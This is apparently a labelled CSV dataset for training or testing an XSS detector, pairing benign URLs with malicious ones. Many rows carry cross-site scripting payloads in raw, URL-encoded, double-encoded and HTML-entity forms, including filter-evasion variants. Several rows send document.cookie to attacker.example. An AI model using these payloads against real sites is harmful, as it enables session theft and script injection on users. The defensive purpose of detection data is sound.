url,payload,carrier,param_name,encoded,notes,label
https://demo.example.org/search?utm_source=2025-10-01-ref24519,2025-10-01-ref24519,query,utm_source,raw,benign,0
https://demo.example.org/user/home/profile,home,path,,raw,benign,0
https://webapp.local/search?callback=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,callback,raw,script_in_math,1
https://service.test/user/en/profile,en,path,,raw,benign,0
https://service.test/search?callback={{constructor.constructor('alert(1)')()}},{{constructor.constructor('alert(1)')()}},query,callback,raw,template_injection,1
https://webapp.local/search?session=item-new,item-new,query,session,raw,benign,0
https://portal.example.net/search?session=checkout-usr48267,checkout-usr48267,query,session,raw,benign,0
https://portal.example.net/search?s=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,s,raw,cookie_exfil,1
https://testsite.local/user/login/profile,login,path,,raw,benign,0
"https://testsite.local/search?view=""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)>",query,view,raw,attribute_breakout_img,1
https://example.com/user/%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E/profile,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,path,,mixed,svg_cdata_script,1
https://service.test/api?callback=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E&id=1,<iframe src='javascript:alert(1)'></iframe>,callback,callback,urlencoded,iframe_js_uri,1
https://demo.example.org/redirect?url=https://victim.example/?p=%3Cbody%20onload%3Dalert%281%29%3E,<body onload=alert(1)>,redirect,name,urlencoded,body_onload,1
https://testsite.local/search?file=&lt;script&gt;fetch(&#x27;http://attacker.example/steal?c=&#x27;+document.cookie)&lt;/script&gt;&lang=xyz,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,file,html_entity,cookie_exfil,1
https://shop.example/api?callback=signup&id=1,signup,callback,url,raw,benign,0
https://catalog.example/search?utm_source=en,en,query,utm_source,raw,benign,0
https://example.com/page#<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,fragment,,raw,svg_cdata_script,1
https://service.test/search?term=');document.location='javascript:alert(1)'//,');document.location='javascript:alert(1)'//,query,term,raw,document_location_js,1
https://vulnerable.app/api?callback=javascript%253Aalert%25281%2529&id=1,javascript:alert(1),callback,s,double_urlencoded,js_uri,1
https://demo.example.org/redirect?url=https://victim.example/?p=1&session=organic,1,redirect,file,raw,benign,0
https://demo.example.org/search?term=42&lang=google,42,query,term,raw,benign,0
https://example.com/search?input=news&page=1,news,query,input,raw,benign,0
"https://example.com/search?search=""><svg onload=alert(1)>&lang=newsletter","""><svg onload=alert(1)>",query,search,raw,attribute_breakout_svg,1
https://blog.example/search?callback=about,about,query,callback,raw,benign,0
https://shop.example/user/login/profile,login,path,,raw,benign,0
https://demo.example.org/search?query=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>&lang=1,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,query,raw,script_in_math,1
https://testsite.local/api?callback=%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&id=1,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,callback,callback,urlencoded,script_in_math,1
https://portal.example.net/user/index/profile,index,path,,raw,benign,0
https://example.com/search?file=<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,file,raw,cookie_exfil,1
https://shop.example/page#%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,fragment,,urlencoded,svg_cdata_script,1
https://testsite.local/page#%2527%2529%253Beval%2528String.fromCharCode%252897%252C108%252C101%252C114%252C116%252C40%252C49%252C41%2529%2529%252F%252F,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",fragment,,double_urlencoded,eval_obf,1
https://example.com/api?callback=login&id=1&ref=affiliate,login,callback,msg,raw,benign,0
https://testsite.local/search?ref=category&utm_source=organic,category,query,ref,raw,benign,0
https://shop.example/search?input=item47460&ref=affiliate,item47460,query,input,raw,benign,0
https://service.test/search?id=welcome&session=newsletter,welcome,query,id,raw,benign,0
https://shop.example/page#signup,signup,fragment,,raw,benign,0
https://demo.example.org/search?query=user32633,user32633,query,query,raw,benign,0
https://testsite.local/user/user-202572387/profile,user-202572387,path,,raw,benign,0
https://webapp.local/search?view=product44434,product44434,query,view,raw,benign,0
https://portal.example.net/search?lang=login,login,query,lang,raw,benign,0
https://blog.example/search?redirect=article&page=0,article,query,redirect,raw,benign,0
https://testsite.local/search?callback=prices&lang=en,prices,query,callback,raw,benign,0
https://portal.example.net/page#prices,prices,fragment,,raw,benign,0
https://catalog.example/search?search=article,article,query,search,raw,benign,0
https://demo.example.org/redirect?url=https://victim.example/?p=2025-10-0182424&source=1,2025-10-0182424,redirect,query,raw,benign,0
https://service.test/search?session=blog&session=0,blog,query,session,raw,benign,0
https://blog.example/redirect?url=https://victim.example/?p=order&source=en,order,redirect,s,raw,benign,0
https://testsite.local/api?callback=javascript%3Aalert%281%29&id=1,javascript:alert(1),callback,file,mixed,js_uri,1
https://example.com/search?name=user&utm_source=google,user,query,name,raw,benign,0
https://testsite.local/search?s=login,login,query,s,raw,benign,0
https://demo.example.org/search?view=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,view,raw,svg_cdata_script,1
https://service.test/api?callback=1&id=1,1,callback,search,raw,benign,0
https://shop.example/page#%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,fragment,,mixed,cookie_exfil,1
https://demo.example.org/page#about,about,fragment,,raw,benign,0
https://demo.example.org/search?file=product&ref=google,product,query,file,raw,benign,0
https://catalog.example/api?callback=news&id=1,news,callback,callback,raw,benign,0
https://vulnerable.app/user/%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D/profile,{{constructor.constructor('alert(1)')()}},path,,mixed,template_injection,1
https://catalog.example/search?lang=order,order,query,lang,raw,benign,0
https://blog.example/search?term=427183&lang=0,427183,query,term,raw,benign,0
https://demo.example.org/search?redirect=&lt;script&gt;alert(1)&lt;/script&gt;,<script>alert(1)</script>,query,redirect,html_entity,script_tag,1
https://portal.example.net/search?q=42,42,query,q,raw,benign,0
https://demo.example.org/search?name=product-2025&utm_source=affiliate,product-2025,query,name,raw,benign,0
https://blog.example/user/test-2025/profile,test-2025,path,,raw,benign,0
https://demo.example.org/api?callback=<body onload=alert(1)>&id=1,<body onload=alert(1)>,callback,callback,raw,body_onload,1
https://demo.example.org/user/%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F/profile,');document.location='javascript:alert(1)'//,path,,urlencoded,document_location_js,1
https://webapp.local/api?callback=prices&id=1&session=affiliate,prices,callback,lang,raw,benign,0
https://shOp.ExamplE/search?input=%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,query,input,urlencoded,already_encoded,1
https://webapp.local/search?query=<iframe src='javascript:alert(1)'></iframe>,<iframe src='javascript:alert(1)'></iframe>,query,query,raw,iframe_js_uri,1
https://testsite.local/api?callback=category&id=1,category,callback,ref,raw,benign,0
https://vulnerable.app/redirect?url=https://victim.example/?p=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,redirect,view,raw,svg_cdata_script,1
https://testsite.local/api?callback=prices&id=1,prices,callback,lang,raw,benign,0
https://example.com/search?callback=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,callback,raw,meta_refresh_js_uri,1
https://service.test/page#&#x27;);alert(1);//,');alert(1);//,fragment,,html_entity,inline_js_snippet,1
https://webapp.loCal/redirect?url=https://victim.example/?p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,redirect,query,urlencoded,script_tag,1
https://service.test/user/1/profile,1,path,,raw,benign,0
https://service.test/api?callback=page8299&id=1&lang=google,page8299,callback,utm_source,raw,benign,0
https://service.test/search?ref=details,details,query,ref,raw,benign,0
https://shop.example/page#%22%3E%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,"""><video><source onerror=alert(1)></video>",fragment,,urlencoded,attribute_breakout_video,1
https://testsite.local/user/en/profile,en,path,,raw,benign,0
https://demo.example.org/api?callback=category48033&id=1,category48033,callback,query,raw,benign,0
https://portal.example.net/api?callback=category&id=1,category,callback,query,raw,benign,0
https://service.test/user/blog/profile,blog,path,,raw,benign,0
https://catalog.example/page#en,en,fragment,,raw,benign,0
https://webapp.local/user/%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F/profile,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",path,,urlencoded,eval_obf,1
https://mysite.example/search?file=checkout&page=organic,checkout,query,file,raw,benign,0
https://demo.example.org/search?redirect=prices,prices,query,redirect,raw,benign,0
https://blog.example/search?input=blog&page=affiliate,blog,query,input,raw,benign,0
https://example.com/user/news/profile,news,path,,raw,benign,0
https://catalog.example/search?view=1&utm_source=affiliate,1,query,view,raw,benign,0
https://demo.example.org/search?id=%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,query,id,urlencoded,already_encoded,1
https://webapp.local/api?callback=checkout&id=1,checkout,callback,id,raw,benign,0
https://webapp.local/search?id=42,42,query,id,raw,benign,0
https://webapp.local/search?url=product&page=en,product,query,url,raw,benign,0
https://webapp.local/api?callback={{constructor.constructor('alert(1)')()}}&id=1,{{constructor.constructor('alert(1)')()}},callback,callback,raw,template_injection,1
https://demo.example.org/api?callback=%253Cmeta%2520http-equiv%253D%2527refresh%2527%2520content%253D%25270%253Burl%253Djavascript%253Aalert%25281%2529%2527%253E&id=1,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,callback,callback,double_urlencoded,meta_refresh_js_uri,1
https://service.test/search?page=prices&lang=1,prices,query,page,raw,benign,0
https://shop.example/search?term=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,term,raw,script_in_math,1
https://shop.example/search?s=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>&page=xyz,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,s,raw,meta_refresh_js_uri,1
https://vulnerable.app/user/%253Cscript%253Ealert%281%29%253C%2Fscript%253E/profile,%3Cscript%3Ealert(1)%3C/script%3E,path,,urlencoded,already_encoded,1
https://blog.example/search?lang=welcome17295&session=en,welcome17295,query,lang,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=contact&page=organic,contact,redirect,search,raw,benign,0
https://shop.example/search?id=checkout,checkout,query,id,raw,benign,0
https://blog.example/api?callback=checkout&id=1,checkout,callback,msg,raw,benign,0
https://service.test/search?s=order,order,query,s,raw,benign,0
https://mysite.example/search?page=home-ref,home-ref,query,page,raw,benign,0
https://example.com/page#%22%3E%3Csvg+onload%3Dalert%281%29%3E,"""><svg onload=alert(1)>",fragment,,mixed,attribute_breakout_svg,1
https://service.test/api?callback=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F&id=1&ref=0,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",callback,callback,urlencoded,eval_obf,1
https://service.test/redirect?url=https://victim.example/?p=&#x27;);alert(1);//,');alert(1);//,redirect,tmpl,html_entity,inline_js_snippet,1
https://portal.example.net/page#en70643,en70643,fragment,,raw,benign,0
https://example.com/search?redirect=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,query,redirect,urlencoded,script_tag,1
https://portal.example.net/redirect?url=https://victim.example/?p=&lt;math&gt;&lt;mi&gt;&lt;/mi&gt;&lt;mfrac&gt;&lt;mn&gt;&lt;/mn&gt;&lt;/mfrac&gt;&lt;/math&gt;&lt;script&gt;alert(1)&lt;/script&gt;&utm_source=1,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,redirect,tmpl,html_entity,script_in_math,1
https://example.com/search?session=42&ref=1,42,query,session,raw,benign,0
https://webapp.local/search?view=en,en,query,view,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=signup,signup,redirect,name,raw,benign,0
https://testsite.local/search?msg=news&session=1,news,query,msg,raw,benign,0
https://catalog.example/search?callback=login,login,query,callback,raw,benign,0
https://webapp.local/api?callback=%22%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E&id=1&page=1,"""><video><source onerror=alert(1)></video>",callback,callback,mixed,attribute_breakout_video,1
https://example.com/search?s=page,page,query,s,raw,benign,0
https://service.test/api?callback=%253Cimg%2520src%253D1%2520onerror%253Dalert%2528String.fromCharCode%252888%252C83%252C83%2529%2529%253E&id=1,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",callback,callback,double_urlencoded,img_onerror_obf,1
https://demo.example.org/user/cart-new/profile,cart-new,path,,raw,benign,0
https://webapp.local/user/article/profile,article,path,,raw,benign,0
https://testsite.local/search?callback=test,test,query,callback,raw,benign,0
https://webapp.local/user/product/profile,product,path,,raw,benign,0
https://demo.exAmple.oRg/page#%27%29%3Balert%281%29%3B%2F%2F,');alert(1);//,fragment,,urlencoded,inline_js_snippet,1
https://blog.example/search?session=blog,blog,query,session,raw,benign,0
https://mysite.example/search?callback=signup&session=en,signup,query,callback,raw,benign,0
"https://demo.example.org/page#&lt;img src=1 onerror=alert(String.fromCharCode(88,83,83))&gt;","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",fragment,,html_entity,img_onerror_obf,1
https://catalog.example/page#category,category,fragment,,raw,benign,0
https://mysite.example/search?session=index-usr,index-usr,query,session,raw,benign,0
https://demo.example.org/search?s=about&utm_source=google,about,query,s,raw,benign,0
https://demo.example.org/search?query=42,42,query,query,raw,benign,0
https://shop.example/search?lang=home,home,query,lang,raw,benign,0
https://mysite.example/page#contact,contact,fragment,,raw,benign,0
https://webapp.local/search?input=signup&lang=affiliate,signup,query,input,raw,benign,0
https://example.com/search?utm_source=product&utm_source=1,product,query,utm_source,raw,benign,0
https://portal.example.net/api?callback=cart&id=1,cart,callback,input,raw,benign,0
https://webapp.local/search?term=prices,prices,query,term,raw,benign,0
https://service.test/user/page/profile,page,path,,raw,benign,0
https://demo.example.org/page#article,article,fragment,,raw,benign,0
https://testsite.local/search?ref=checkout-new,checkout-new,query,ref,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=&lt;body onload=alert(1)&gt;&lang=1,<body onload=alert(1)>,redirect,page,html_entity,body_onload,1
https://testsite.local/search?ref=contact,contact,query,ref,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>&ref=newsletter,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,redirect,q,raw,script_in_math,1
https://shop.example/search?input=cart,cart,query,input,raw,benign,0
https://portal.example.net/search?msg=about&lang=organic,about,query,msg,raw,benign,0
https://webapp.local/search?id=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F,');document.location='javascript:alert(1)'//,query,id,mixed,document_location_js,1
https://blog.example/search?input=en-info,en-info,query,input,raw,benign,0
https://demo.example.org/search?msg=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,msg,raw,meta_refresh_js_uri,1
"https://testsite.local/api?callback=');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//&id=1","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",callback,callback,raw,eval_obf,1
https://blog.example/search?redirect=prices,prices,query,redirect,raw,benign,0
https://portal.example.net/search?view=item&utm_source=0,item,query,view,raw,benign,0
https://demo.example.org/search?redirect={{constructor.constructor('alert(1)')()}},{{constructor.constructor('alert(1)')()}},query,redirect,raw,template_injection,1
https://mysite.example/user/42/profile,42,path,,raw,benign,0
https://demo.example.org/search?session=42-new,42-new,query,session,raw,benign,0
https://example.com/search?view=&lt;script&gt;alert(1)&lt;/script&gt;,<script>alert(1)</script>,query,view,html_entity,script_tag,1
https://shop.example/search?id=%253Ciframe%2520src%253D%2527javascript%253Aalert%25281%2529%2527%253E%253C%252Fiframe%253E&ref=0,<iframe src='javascript:alert(1)'></iframe>,query,id,double_urlencoded,iframe_js_uri,1
https://testsite.local/search?url=welcome-usr&ref=google,welcome-usr,query,url,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=en,en,redirect,input,raw,benign,0
https://testsite.local/search?view=category25447,category25447,query,view,raw,benign,0
https://portal.example.net/search?view=%22%3E%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,"""><video><source onerror=alert(1)></video>",query,view,urlencoded,attribute_breakout_video,1
https://mysite.example/user/news/profile,news,path,,raw,benign,0
https://catalog.example/page#1,1,fragment,,raw,benign,0
https://shop.example/search?input=user-2025&source=affiliate,user-2025,query,input,raw,benign,0
https://portal.example.net/search?redirect=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>&ref=xyz,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,redirect,raw,svg_cdata_script,1
https://mysite.example/api?callback=login&id=1,login,callback,ref,raw,benign,0
https://example.com/search?file=42,42,query,file,raw,benign,0
https://mysite.example/user/order/profile,order,path,,raw,benign,0
https://portal.example.net/redirect?url=https://victim.example/?p={{constructor.constructor('alert(1)')()}}&ref=newsletter,{{constructor.constructor('alert(1)')()}},redirect,view,raw,template_injection,1
"https://demo.example.org/redirect?url=https://victim.example/?p=');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//&lang=en","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",redirect,page,raw,eval_obf,1
https://testsite.local/api?callback=%3Cimg+src%3D1+onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E&id=1,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",callback,s,mixed,img_onerror_obf,1
https://portal.example.net/search?lang=42,42,query,lang,raw,benign,0
https://service.test/search?utm_source=42&source=0,42,query,utm_source,raw,benign,0
https://mysite.example/search?s=profile&utm_source=1,profile,query,s,raw,benign,0
https://vulnerable.app/page#%253Csvg%253E%253Cdesc%253E%253C%2521%255BCDATA%255B%253C%252Fdesc%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%255D%255D%253E%253C%252Fsvg%253E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,fragment,,double_urlencoded,svg_cdata_script,1
https://catalog.example/search?msg=item-ref49729,item-ref49729,query,msg,raw,benign,0
https://service.test/api?callback=welcome52223&id=1,welcome52223,callback,query,raw,benign,0
https://catalog.example/search?s=signup&session=organic,signup,query,s,raw,benign,0
https://demo.example.org/search?name=signup&utm_source=1,signup,query,name,raw,benign,0
https://shop.example/search?page=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,page,raw,meta_refresh_js_uri,1
https://demo.example.org/api?callback=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E&id=1,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,callback,tmpl,urlencoded,svg_cdata_script,1
https://shop.example/user/blog/profile,blog,path,,raw,benign,0
https://service.test/search?redirect=%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Djavascript%3Aalert%281%29%27%3E&page=en,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,redirect,urlencoded,meta_refresh_js_uri,1
https://portal.example.net/redirect?url=https://victim.example/?p=');document.location='javascript:alert(1)'//&lang=newsletter,');document.location='javascript:alert(1)'//,redirect,query,raw,document_location_js,1
https://blog.example/api?callback=signup-details&id=1,signup-details,callback,term,raw,benign,0
https://testsite.local/search?redirect=%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Djavascript%3Aalert%281%29%27%3E&page=google,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,redirect,urlencoded,meta_refresh_js_uri,1
https://example.com/search?url=179912,179912,query,url,raw,benign,0
https://portal.example.net/search?q=prices,prices,query,q,raw,benign,0
https://service.test/search?search=%27%29%3Balert%281%29%3B%2F%2F,');alert(1);//,query,search,mixed,inline_js_snippet,1
https://service.test/user/item/profile,item,path,,raw,benign,0
https://catalog.example/search?name=en57536&lang=1,en57536,query,name,raw,benign,0
https://catalog.example/search?session=prices,prices,query,session,raw,benign,0
https://catalog.example/api?callback=contact&id=1&page=affiliate,contact,callback,q,raw,benign,0
https://catalog.example/redirect?url=https://victim.example/?p=news&utm_source=google,news,redirect,lang,raw,benign,0
https://example.com/search?file=%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,"""><img src=x onerror=alert(1)>",query,file,double_urlencoded,attribute_breakout_img,1
"https://vulnerable.app/page#""><video><source onerror=alert(1)></video>","""><video><source onerror=alert(1)></video>",fragment,,raw,attribute_breakout_video,1
https://testsite.local/search?input=prices,prices,query,input,raw,benign,0
https://example.com/api?callback=en&id=1,en,callback,name,raw,benign,0
https://testsite.local/search?term=welcome67964&source=newsletter,welcome67964,query,term,raw,benign,0
https://webapp.local/search?page=category-ref&session=1,category-ref,query,page,raw,benign,0
https://service.test/search?session=article,article,query,session,raw,benign,0
https://portal.example.net/search?q=details10766&page=affiliate,details10766,query,q,raw,benign,0
https://webapp.local/api?callback=category&id=1,category,callback,q,raw,benign,0
https://shop.example/api?callback=user&id=1,user,callback,page,raw,benign,0
https://shop.example/redirect?url=https://victim.example/?p=en,en,redirect,url,raw,benign,0
https://service.test/search?name=test&page=newsletter,test,query,name,raw,benign,0
https://vulnerable.app/user/%3Cbody%20onload%3Dalert%281%29%3E/profile,<body onload=alert(1)>,path,,urlencoded,body_onload,1
https://demo.example.org/search?file=%3Cbody%20onload%3Dalert%281%29%3E&ref=google,<body onload=alert(1)>,query,file,urlencoded,body_onload,1
https://vulnerable.app/search?search=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>&lang=0,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,search,raw,svg_cdata_script,1
"https://testsite.local/search?tmpl=');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,tmpl,raw,eval_obf,1
https://example.com/api?callback=article64499&id=1,article64499,callback,session,raw,benign,0
https://example.com/user/blog/profile,blog,path,,raw,benign,0
https://blog.example/user/test/profile,test,path,,raw,benign,0
https://example.com/search?q=contact,contact,query,q,raw,benign,0
https://webapp.local/search?session=profile,profile,query,session,raw,benign,0
https://service.test/search?url=index,index,query,url,raw,benign,0
https://vulnerable.app/redirect?url=https://victim.example/?p=%22%3E%3Csvg%20onload%3Dalert%281%29%3E,"""><svg onload=alert(1)>",redirect,query,urlencoded,attribute_breakout_svg,1
https://demo.example.org/search?page=test&source=newsletter,test,query,page,raw,benign,0
https://demo.example.org/page#welcome,welcome,fragment,,raw,benign,0
https://service.test/search?file=about&utm_source=newsletter,about,query,file,raw,benign,0
https://catalog.example/redirect?url=https://victim.example/?p=profile24345,profile24345,redirect,url,raw,benign,0
https://shop.example/search?name=42&utm_source=newsletter,42,query,name,raw,benign,0
https://shop.example/search?callback=user,user,query,callback,raw,benign,0
https://shop.example/search?id=category,category,query,id,raw,benign,0
https://portal.example.net/api?callback=&lt;body onload=alert(1)&gt;&id=1,<body onload=alert(1)>,callback,callback,html_entity,body_onload,1
https://portal.example.net/user/<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>/profile,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,path,,raw,cookie_exfil,1
https://example.com/redirect?url=https://victim.example/?p=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,redirect,search,urlencoded,svg_cdata_script,1
https://demo.example.org/search?id=&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0;url=javascript:alert(1)&#x27;&gt;,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,id,html_entity,meta_refresh_js_uri,1
https://vulnerable.app/page#&lt;body onload=alert(1)&gt;,<body onload=alert(1)>,fragment,,html_entity,body_onload,1
https://service.test/api?callback=javascript:alert(1)&id=1,javascript:alert(1),callback,callback,raw,js_uri,1
"https://webapp.local/search?page=""><svg onload=alert(1)>","""><svg onload=alert(1)>",query,page,raw,attribute_breakout_svg,1
https://vulnerable.app/redirect?url=https://victim.example/?p=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,redirect,input,raw,meta_refresh_js_uri,1
https://example.com/search?term=javascript%3Aalert%281%29,javascript:alert(1),query,term,urlencoded,js_uri,1
https://portal.example.net/api?callback=checkout&id=1,checkout,callback,search,raw,benign,0
https://blog.example/search?redirect=user&source=affiliate,user,query,redirect,raw,benign,0
https://catalog.example/page#home,home,fragment,,raw,benign,0
https://testsite.local/search?redirect=login-2025,login-2025,query,redirect,raw,benign,0
https://webapp.local/api?callback=details&id=1,details,callback,callback,raw,benign,0
https://portal.example.net/search?id=home,home,query,id,raw,benign,0
https://portal.example.net/page#');alert(1);//,');alert(1);//,fragment,,raw,inline_js_snippet,1
https://webapp.local/api?callback=javascript:alert(1)&id=1,javascript:alert(1),callback,callback,html_entity,js_uri,1
https://shop.example/search?page=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,page,urlencoded,svg_cdata_script,1
https://webapp.local/redirect?url=https://victim.example/?p=<body onload=alert(1)>,<body onload=alert(1)>,redirect,page,raw,body_onload,1
https://testsite.local/search?s=welcome,welcome,query,s,raw,benign,0
https://Shop.eXample/search?query=%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,query,mixed,cookie_exfil,1
https://webapp.local/search?search=login&session=en,login,query,search,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=category-x,category-x,redirect,view,raw,benign,0
